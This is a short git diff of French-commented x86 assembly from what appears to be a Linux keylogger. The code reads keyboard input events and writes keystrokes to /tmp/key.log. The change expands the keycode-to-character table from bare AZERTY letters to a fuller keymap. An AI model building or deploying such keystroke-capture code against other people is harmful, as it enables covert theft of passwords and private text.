@@ -39,7 +39,7 @@ input:
     jne log       ; jump equal
 
     mov byte al, [ecx + 10]         ; event.code (valeur en hexa de la touche du clavier)
-    mov byte bl, [Ascii + eax]    ; utiliser cette valeur comme index dans notre string qui représente notre clavier pour trouver la touche du clavier
+    mov byte bl, [ascii + eax]    ; utiliser cette valeur comme index dans notre string qui représente notre clavier pour trouver la touche du clavier
     push ebx  
 
 
@@ -62,7 +62,7 @@ section .data
     output_file   db "/tmp/key.log", 0
     errMsg db "Besoin des privilèges du superUtilisateur", 0xa
     lenErrMsg equ $ - errMsg
-    Ascii db `azertyuiopqsdfghjklmwxcvbn`
+    ascii db `??1234567890)=\b\tazertyuiop??\n?qsdfghjklmù*?<wxcvbn,./!`
 
 section .bss
     input_event resb 16    ; 16 bytes récupérer en hexadécimal ( 8 premiers -> temps etc ... -> 2 suivant = event type -> 2 suivant = code type -> 4 suivant = valeur input)
